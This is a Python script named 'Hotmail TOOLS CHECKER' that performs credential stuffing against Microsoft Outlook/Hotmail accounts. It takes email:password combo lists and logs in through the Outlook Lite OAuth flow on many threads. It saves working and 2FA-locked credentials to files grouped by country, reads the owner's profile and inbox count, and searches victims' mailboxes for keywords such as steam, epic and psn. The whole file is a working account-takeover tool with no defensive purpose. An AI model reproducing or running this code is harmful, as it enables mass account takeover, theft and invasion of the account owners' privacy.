import requests
import json
import uuid
import re
import time
import os
import sys
import webbrowser
from datetime import datetime
from pathlib import Path
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict

class MobileHotmailChecker:
    def __init__(self, keywords=None, debug=False, api_mode=1):
        self.session  = requests.Session()
        self.uuid     = str(uuid.uuid4())
        self.debug    = debug
        self.keywords = keywords if keywords else []
        self.api_mode = api_mode

    def log(self, message):
        if self.debug:
            print(f"[DEBUG] {message}")

    def parse_country_from_json(self, json_data):
        try:
            if isinstance(json_data, dict):
                if "accounts" in json_data and isinstance(json_data["accounts"], list):
                    for account in json_data["accounts"]:
                        if isinstance(account, dict) and "location" in account and account["location"]:
                            return str(account["location"]).strip()
                if "location" in json_data and json_data["location"]:
                    location = json_data["location"]
                    if isinstance(location, str):
                        parts = [p.strip() for p in location.split(',')]
                        return parts[-1] if parts else ""
                    elif isinstance(location, dict):
                        for key in ["country", "countryOrRegion", "countryCode"]:
                            if key in location and location[key]:
                                return str(location[key])
                for key in ["country", "countryOrRegion", "countryCode", "Country"]:
                    if key in json_data and json_data[key]:
                        return str(json_data[key])
        except:
            pass
        return ""

    def parse_name_from_json(self, json_data):
        try:
            if isinstance(json_data, dict):
                if "displayName" in json_data and json_data["displayName"]:
                    return str(json_data["displayName"])
                for key in ["name", "givenName", "fullName"]:
                    if key in json_data and json_data[key]:
                        return str(json_data[key])
        except:
            pass
        return ""

    def extract_inbox_count(self, text):
        try:
            patterns = [
                r'"DisplayName":"Inbox","TotalCount":(\d+)',
                r'"TotalCount":(\d+)',
                r'Inbox","TotalCount":(\d+)'
            ]
            for pattern in patterns:
                match = re.search(pattern, text)
                if match:
                    return match.group(1)
        except:
            pass
        return "0"

    def check(self, email, password):
        try:
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": self.uuid,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = self.session.get(url1, headers=headers1, timeout=15)

            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return {"status": "BAD", "keywords": {}, "country": "", "name": "", "inbox_count": "0"}
            if "MSAccount" not in r1.text:
                return {"status": "BAD", "keywords": {}, "country": "", "name": "", "inbox_count": "0"}

            time.sleep(0.3)
            url2 = (
                f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
                f"?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code"
                f"&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            )
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            r2 = self.session.get(url2, headers=headers2, allow_redirects=True, timeout=15)

            url_match  = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)

            if not url_match or not ppft_match:
                return {"status": "BAD", "keywords": {}, "country": "", "name": "", "inbox_count": "0"}

            post_url = url_match.group(1).replace("\\/", "/")
            ppft     = ppft_match.group(1)

            login_data = (
                f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1"
                f"&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}"
                f"&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx="
                f"&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs="
                f"&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0"
                f"&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            )
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)

            response_text = r3.text.lower()

            if "account or password is incorrect" in response_text or r3.text.count("error") > 0:
                return {"status": "BAD", "keywords": {}, "country": "", "name": "", "inbox_count": "0"}

            if "https://account.live.com/identity/confirm" in r3.text or "identity/confirm" in response_text:
                return {"status": "2FA", "keywords": {}, "country": "", "name": "", "inbox_count": "0", "email": email, "password": password}

            if "https://account.live.com/Consent" in r3.text or "consent" in response_text:
                return {"status": "2FA", "keywords": {}, "country": "", "name": "", "inbox_count": "0", "email": email, "password": password}

            if "https://account.live.com/Abuse" in r3.text:
                return {"status": "BAD", "keywords": {}, "country": "", "name": "", "inbox_count": "0"}

            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD", "keywords": {}, "country": "", "name": "", "inbox_count": "0"}

            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD", "keywords": {}, "country": "", "name": "", "inbox_count": "0"}

            code   = code_match.group(1)
            mspcid = self.session.cookies.get("MSPCID", "")
            if not mspcid:
                return {"status": "BAD", "keywords": {}, "country": "", "name": "", "inbox_count": "0"}
            cid = mspcid.upper()

            token_data = (
                f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                f"&grant_type=authorization_code&code={code}"
                f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            )
            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)

            if "access_token" not in r4.text:
                return {"status": "BAD", "keywords": {}, "country": "", "name": "", "inbox_count": "0"}

            token_json   = r4.json()
            access_token = token_json["access_token"]

            if self.api_mode == 3:
                return {"status": "LIVE", "keywords": {}, "country": "", "name": "", "inbox_count": "0", "email": email, "password": password}

            profile_headers = {"User-Agent": "Outlook-Android/2.0", "Authorization": f"Bearer {access_token}", "X-AnchorMailbox": f"CID:{cid}"}
            country = ""
            name    = ""
            try:
                r5 = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=profile_headers, timeout=15)
                if r5.status_code == 200:
                    profile = r5.json()
                    country = self.parse_country_from_json(profile)
                    name    = self.parse_name_from_json(profile)
            except:
                pass

            inbox_count = "0"
            if self.api_mode == 1:
                try:
                    startup_headers = {"Host": "outlook.live.com", "content-length": "0", "x-owa-sessionid": str(uuid.uuid4()), "x-req-source": "Mini", "authorization": f"Bearer {access_token}", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36", "action": "StartupData", "x-owa-correlationid": str(uuid.uuid4()), "content-type": "application/json; charset=utf-8", "accept": "*/*"}
                    r6a = self.session.post(f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0", data="", headers=startup_headers, timeout=20)
                    if r6a.status_code == 200:
                        inbox_count = self.extract_inbox_count(r6a.text)
                except Exception as e:
                    self.log(f"StartupData error: {e}")

            keyword_results = {}
            if self.keywords:
                for keyword in self.keywords:
                    try:
                        query_string = keyword
                        if "@" in keyword and " " not in keyword: query_string = 'from:"' + keyword + '" OR "' + keyword + '"'
                        payload = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off", "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]}, "From": 0, "Query": {"QueryString": query_string}, "Size": 10, "Sort": [{"Field": "Time", "SortDirection": "Desc"}], "Fields": ["Subject", "From", "ReceivedTime", "Preview"]}], "AnswerEntityRequests": [], "QueryAlterationOptions": {"EnableSuggestion": False, "EnableAlteration": False, "SupportedRecourseDisplayTypes": []}, "LogicalId": str(uuid.uuid4())}
                        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "application/json", "Authorization": f"Bearer {access_token}", "X-AnchorMailbox": f"CID:{cid}", "Content-Type": "application/json"}
                        search_response = self.session.post("https://outlook.live.com/search/api/v2/query", json=payload, headers=headers, timeout=10)
                        if search_response and search_response.status_code == 200:
                            search_data = search_response.json()
                            total    = 0
                            subjects = []
                            if "EntitySets" in search_data and len(search_data["EntitySets"]) > 0:
                                entity_set = search_data["EntitySets"][0]
                                if "ResultSets" in entity_set and len(entity_set["ResultSets"]) > 0:
                                    result_set = entity_set["ResultSets"][0]
                                    total      = result_set.get("Total", 0)
                                    if total > 0 and "Results" in result_set:
                                        for result_item in result_set["Results"][:5]:
                                            container = (result_item.get("Document") or result_item.get("Item") or result_item)
                                            subject = (container.get("Subject") or container.get("subject") or container.get("NormalizedSubject") or "")
                                            if not subject and "Source" in container:
                                                src     = container.get("Source") or {}
                                                subject = src.get("Subject") or src.get("NormalizedSubject") or ""
                                            if subject: subjects.append(subject)
                            if total > 0: keyword_results[keyword] = {"count": total, "subjects": subjects}
                    except Exception as e:
                        continue

            return {"status": "LIVE", "keywords": keyword_results, "country": country, "name": name, "inbox_count": inbox_count, "email": email, "password": password}

        except requests.exceptions.Timeout:
            return {"status": "TIMEOUT", "keywords": {}, "country": "", "name": "", "inbox_count": "0"}
        except Exception as e:
            return {"status": "ERROR", "keywords": {}, "country": "", "name": "", "inbox_count": "0"}


class ResultManager:
    def __init__(self, combo_filename, mode_name):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        if os.name == 'nt':  # Windows PC
            desktop = os.path.join(os.path.expanduser("~"), "Desktop")
            self.base_folder = os.path.join(desktop, "NovaHotmail", f"({timestamp})_{combo_filename}_{mode_name}_HITS")
        else:  # Android / Pydroid 3
            self.base_folder = os.path.join("/sdcard", "NovaHotmail", f"({timestamp})_{combo_filename}_{mode_name}_HITS")

        self.keywords_folder = os.path.join(self.base_folder, "Keywords_Found")
        self.all_hits_file = os.path.join(self.base_folder, "Nova_HITS.txt")
        self.two_fa_file = os.path.join(self.base_folder, "Nova_2FA_Locked.txt")
        self.countries_folder = os.path.join(self.base_folder, "countries")

        Path(self.keywords_folder).mkdir(parents=True, exist_ok=True)
        Path(self.countries_folder).mkdir(parents=True, exist_ok=True)

        with open(self.all_hits_file, "w", encoding="utf-8") as f:
            f.write("# xDarkLogx3 Premium Checker - Live Results\n\n")

    def save_hit(self, email, password, result_data):
        keywords = result_data.get("keywords", {})
        country = result_data.get("country", "").strip().upper() or "UNKNOWN"

        with open(self.all_hits_file, "a", encoding="utf-8") as f:
            f.write(f"{email}:{password}\n")

        country_file = os.path.join(self.countries_folder, f"{country}.txt")
        with open(country_file, "a", encoding="utf-8") as f:
            f.write(f"{email}:{password}\n")

        for keyword, info in keywords.items():
            keyword_file = os.path.join(self.keywords_folder, f"{keyword}.txt")
            count = info.get("count", 0)
            subjects = info.get("subjects", [])
            subjects_str = " ; ".join(subjects[:3]) if subjects else "No subjects"
            line = f"{email}:{password} | {country} | {keyword} | {count} | {subjects_str}\n"
            with open(keyword_file, "a", encoding="utf-8") as f:
                f.write(line)

    def save_2fa(self, email, password):
        try:
            with open(self.two_fa_file, "a", encoding="utf-8") as f:
                f.write(f"{email}:{password}\n")
        except:
            pass


class LiveStats:
    def __init__(self, total):
        self.total = total
        self.checked = 0
        self.hits = 0
        self.two_fa = 0
        self.bads = 0
        self.errors = 0
        self.start_time = time.time()
        self.lock = Lock()
        self.kw_counts = defaultdict(int)

    def update(self, status, res_data=None):
        with self.lock:
            self.checked += 1
            if status == "LIVE":
                self.hits += 1
                if res_data and "keywords" in res_data:
                    for kw, info in res_data["keywords"].items():
                        if info.get("count", 0) > 0:
                            self.kw_counts[kw] += 1
            elif status == "2FA": self.two_fa += 1
            elif status in ["BAD", "TIMEOUT"]: self.bads += 1
            else: self.errors += 1

    def get_stats(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            progress = (self.checked / self.total * 100) if self.total > 0 else 0
            cpm = (self.checked / elapsed * 60) if elapsed > 0 else 0
            return {"total": self.total, "checked": self.checked, "hits": self.hits, "two_fa": self.two_fa, "bads": self.bads, "errors": self.errors, "progress": progress, "cpm": cpm, "elapsed": elapsed, "kw_counts": dict(self.kw_counts)}

    def print_stats(self, colors):
        stats = self.get_stats()
        elapsed_str = time.strftime("%H:%M:%S", time.gmtime(stats["elapsed"]))

        sys.stdout.write("\r" + " " * 85 + "\r")
        sys.stdout.write(
            f"{colors.CYAN}║{colors.END} {colors.WHITE}[{colors.CYAN}{stats['checked']}{colors.WHITE}/{colors.CYAN}{stats['total']}{colors.WHITE}]{colors.END} "
            f"{colors.GREEN}HITS: {stats['hits']}{colors.END} │ "
            f"{colors.YELLOW}2FA: {stats['two_fa']}{colors.END} │ "
            f"{colors.RED}DEAD: {stats['bads']}{colors.END} │ "
            f"{colors.PURPLE}{stats['progress']:.1f}%{colors.END} │ "
            f"{colors.WHITE}{stats['cpm']:.0f} CPM{colors.END} │ "
            f"{colors.CYAN}{elapsed_str}{colors.END} "
        )
        sys.stdout.flush()


class Colors:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    PURPLE  = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    BOLD    = "\033[1m"
    END     = "\033[0m"


def pick_file_dialog(title="Dosya Seç", filetypes=None):
    """Tkinter ile dosya seçici açar. Seçim yapılmazsa boş string döner."""
    try:
        import tkinter as tk
        from tkinter import filedialog
    except ImportError:
        return ""

    if filetypes is None:
        filetypes = [("Text Files", "*.txt"), ("All Files", "*.*")]

    root = tk.Tk()
    root.withdraw()
    root.attributes('-topmost', True)
    path = filedialog.askopenfilename(title=title, filetypes=filetypes)
    root.destroy()
    return path


if __name__ == "__main__":
    os.system("cls" if os.name == "nt" else "clear")

    banner = f"""{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║  Hotmail TOOLS CHECKER V1.0                                   ║
║  By: @xDarkLogx3 | Multi-API + 2FA + Full Dashboard           ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}"""
    print(banner)

    print(f"\n{Colors.CYAN}╔{'═'*56}╗{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.END}  {Colors.WHITE}1. Deep Scan (Profile + Inbox Count + Keywords)     {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.END}  {Colors.WHITE}2. Fast Scan (Profile + Keywords) [RECOMMENDED]     {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.END}  {Colors.WHITE}3. Blitz Scan (Validation Only - Maximum Speed)     {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}╚{'═'*56}╝{Colors.END}")

    api_mode = input(f"\n{Colors.PURPLE}Select API Mode [1-3]: {Colors.END}").strip()
    api_mode = int(api_mode) if api_mode in ["1", "2", "3"] else 2

    print(f"\n{Colors.CYAN}╔{'═'*56}╗{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.END}  {Colors.WHITE}1. Single Account Check                             {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.END}  {Colors.WHITE}2. Mass Combo List Scan (.txt)                      {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}╚{'═'*56}╝{Colors.END}")

    mode_choice = input(f"\n{Colors.PURPLE}Select Checking Style [1-2]: {Colors.END}").strip()
    if mode_choice not in ["1", "2"]: exit()

    threads = 1
    if mode_choice == "2":
        try:
            threads = int(input(f"{Colors.PURPLE}Thread Count (Max 150): {Colors.END}").strip())
        except ValueError:
            threads = 40

    keywords = []
    print(f"\n{Colors.CYAN}╔{'═'*56}╗{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.END}  {Colors.WHITE}1. Enter Keywords Manually (steam, epic, psn etc.)  {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.END}  {Colors.WHITE}2. Load Keywords from txt File                      {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.END}  {Colors.WHITE}3. Skip Keyword Scanning                            {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}╚{'═'*56}╝{Colors.END}")

    kw_choice = input(f"\n{Colors.PURPLE}Select Keyword Option [1-3]: {Colors.END}").strip()

    if kw_choice == "1":
        while True:
            kw = input(f"{Colors.PURPLE}Keyword {len(keywords)+1} (Leave empty to start check): {Colors.END}").strip()
            if not kw: break
            keywords.append(kw)
    elif kw_choice == "2":
        kw_file = pick_file_dialog(title="Keyword Listesi Seç (.txt)")
        if not kw_file:
            print(f"{Colors.RED}❌ Keyword dosyası seçilmedi, keyword taraması atlanıyor.{Colors.END}")
        else:
            try:
                with open(kw_file, 'r', encoding='utf-8') as f:
                    keywords = [l.strip() for l in f.readlines() if l.strip()]
                print(f"{Colors.GREEN}✔ {len(keywords)} keyword yüklendi.{Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}❌ Keyword dosyası okunamadı: {e}{Colors.END}")

    checker = MobileHotmailChecker(keywords=keywords, debug=False, api_mode=api_mode)

    if mode_choice == "1":
        print(f"\n{Colors.CYAN}╠{'═'*54}╣{Colors.END}")
        email = input(f"{Colors.WHITE}Email   : {Colors.END}").strip()
        password = input(f"{Colors.WHITE}Password: {Colors.END}").strip()
        print(f"{Colors.CYAN}╠{'═'*54}╣{Colors.END}")

        print(f"\n{Colors.YELLOW}🔄 Connecting to Microsoft Live Servers...{Colors.END}\n")
        res = checker.check(email, password)

        if res["status"] == "LIVE":
            print(f"{Colors.GREEN}[+] LIVE ACCOUNT FOUND!{Colors.END}")
            print(f"    Target : {email}")
            if res["name"]: print(f"    Owner  : {res['name']}")
            if res["country"]: print(f"    Region : {res['country']}")
            if res["inbox_count"] != "0": print(f"    Inbox  : {res['inbox_count']} unread")
        elif res["status"] == "2FA":
            print(f"{Colors.YELLOW}[!] 2FA / SECURITY LOCK DETECTED!{Colors.END}")
            print(f"    Target : {email}")
        else:
            print(f"{Colors.RED}[-] BAD / INVALID PASSWORD{Colors.END}")
            print(f"    Target : {email}")
        print(f"\n{Colors.CYAN}╚{'═'*54}╝{Colors.END}")

    else:
        file_path = pick_file_dialog(title="Combo Listesi Seç (.txt)")

        if not file_path:
            print(f"{Colors.RED}❌ Combo dosyası seçilmedi, çıkılıyor.{Colors.END}")
            sys.exit()

        print(f"{Colors.GREEN}✔ Seçilen dosya: {file_path}{Colors.END}")

        try:
            with open(file_path, "r", encoding="utf-8") as f:
                lines = [l.strip() for l in f.readlines() if l.strip() and ":" in l]

            combo_name = os.path.basename(file_path).replace(".txt", "")
            result_manager = ResultManager(combo_name, f"mode{api_mode}")
            live_stats = LiveStats(len(lines))

            print_lock = Lock()

            print(f"\n{Colors.CYAN}╔{'═'*54}╗{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.END}  {Colors.BOLD}{Colors.GREEN}🚀 NOVA MASS PROCESSING INITIATED...{Colors.PURPLE}               ║{Colors.END}")
            print(f"{Colors.CYAN}╠{'═'*54}╣{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.END}  {Colors.WHITE}Total Combos :{Colors.END} {Colors.CYAN}{len(lines):<39}{Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.END}  {Colors.WHITE}Thread Pool  :{Colors.END} {Colors.CYAN}{threads:<39}{Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.END}  {Colors.WHITE}Output Path  :{Colors.END} {Colors.GREEN}{result_manager.base_folder[:39]:<39}{Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}╚{'═'*54}╝{Colors.END}\n")

            def process_account(line):
                try:
                    em, pw = line.split(":", 1)
                    tc = MobileHotmailChecker(keywords=keywords, debug=False, api_mode=api_mode)
                    res = tc.check(em.strip(), pw.strip())
                    live_stats.update(res["status"], res)

                    with print_lock:
                        if res["status"] == "LIVE":
                            sys.stdout.write("\r" + " " * 85 + "\r")
                            print(f"{Colors.GREEN}[+] HIT: {em[:35]:<35}{Colors.END}")
                            result_manager.save_hit(em.strip(), pw.strip(), res)
                        elif res["status"] == "2FA":
                            result_manager.save_2fa(em.strip(), pw.strip())

                        live_stats.print_stats(Colors)
                except Exception:
                    live_stats.update("ERROR")

            with ThreadPoolExecutor(max_workers=threads) as executor:
                executor.map(process_account, lines)

            fs = live_stats.get_stats()
            print(f"\n\n{Colors.CYAN}╔{'═'*54}╗{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.END}  {Colors.BOLD}{Colors.GREEN}✅ NOVA TOOLS SCAN COMPLETE!{Colors.PURPLE}                     ║{Colors.END}")
            print(f"{Colors.CYAN}╠{'═'*54}╣{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.END}  {Colors.WHITE}Total Checked:{Colors.END} {Colors.WHITE}{fs['checked']:<39}{Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.END}  {Colors.WHITE}Total HITS   :{Colors.END} {Colors.GREEN}{fs['hits']:<39}{Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.END}  {Colors.WHITE}Total 2FA    :{Colors.END} {Colors.YELLOW}{fs['two_fa']:<39}{Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.END}  {Colors.WHITE}Total DEAD   :{Colors.END} {Colors.RED}{fs['bads']:<39}{Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}╠{'═'*54}╣{Colors.END}")

            if fs["kw_counts"]:
                print(f"{Colors.CYAN}║{Colors.END}  {Colors.BOLD}{Colors.PURPLE}KEYWORD STATISTICS:{Colors.PURPLE}                              ║{Colors.END}")
                for kw, cnt in fs["kw_counts"].items():
                    pct = (cnt / fs["hits"] * 100) if fs["hits"] else 0
                    bar_len = int(pct / 4)
                    bar = "█" * bar_len + "░" * (25 - bar_len)
                    print(f"{Colors.CYAN}║{Colors.END}  {Colors.WHITE}{kw[:10]:>10}{Colors.END}: {Colors.YELLOW}{bar}{Colors.END} {Colors.GREEN}{cnt:>3}{Colors.END} ({pct:.1f}%)  {Colors.CYAN}║{Colors.END}")
                print(f"{Colors.CYAN}╠{'═'*54}╣{Colors.END}")

            print(f"{Colors.CYAN}║{Colors.END}  {Colors.WHITE}Folder Path  :{Colors.END} {Colors.GREEN}{result_manager.base_folder[:39]:<39}{Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}╚{'═'*54}╝{Colors.END}")

        except FileNotFoundError:
            print(f"{Colors.RED}❌ Target Combo file not found!{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}❌ Beklenmeyen hata: {e}{Colors.END}")
